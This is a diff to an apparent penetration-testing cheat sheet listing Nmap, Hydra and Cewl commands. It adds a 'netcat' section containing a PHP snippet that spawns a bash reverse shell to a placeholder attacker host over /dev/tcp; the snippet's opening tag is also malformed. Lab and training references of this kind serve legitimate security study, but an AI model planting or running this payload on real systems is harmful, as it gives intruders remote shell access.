@@ -13,6 +13,7 @@
 - [Hydra](#hydra) - Brute force attack on ssh
 - [FTP](#ftp) 
 - [Cewl](#cewl) - It is use to create a worldlist using website link
+- [netcat](#nc)
 
 - ## Nmap <a name="nmap"></a>
 - ```nmap -sC -sV -vv -oA nmap/report.txt <ip>```
@@ -110,3 +111,10 @@
 
 - ## Cewl <a name="cewl"></a>
 - ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
+
+- ## netcat <a name="nc"></a>
+```php
+<?php>
+exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
+?>
+```
